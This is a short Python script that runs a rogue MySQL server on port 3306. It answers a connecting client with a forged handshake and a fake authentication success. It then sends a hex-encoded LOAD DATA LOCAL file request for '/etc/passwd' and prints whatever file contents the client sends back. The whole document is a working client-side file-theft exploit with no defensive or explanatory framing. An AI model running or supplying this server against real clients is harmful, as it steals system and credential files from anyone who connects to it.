#!/usr/bin/env python
# coding: utf8

import socket

filelist = (
    '/etc/passwd',
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.bind(('localhost', 3306))
sock.listen(1)
print("Listening on 3306")
while True:
    connection,address = sock.accept()  
    try:  
        connection.settimeout(50)
        # greeting
        connection.send(bytes.fromhex("4a0000000a382e302e3333001a00000008596d5b6704272000ffffff0200ffdf15000000000000000000006d605b15337c2e37022e1637006d7973716c5f6e61746976655f70617373776f726400"))

        buf = connection.recv(1024)

        connection.send(bytes.fromhex(""))
        # authentication response
        connection.send(bytes.fromhex("0700000200000002000000"))

        # request to load local file
        buf = connection.recv(4096)
        connection.send(bytes.fromhex("0c000001fb2f6574632f706173737764"))

        # receive the response from the client
        buf = connection.recv(4096)
        print(buf)

        connection.close()
    except socket.timeout:
        print("Time out")
        break


connection.close()  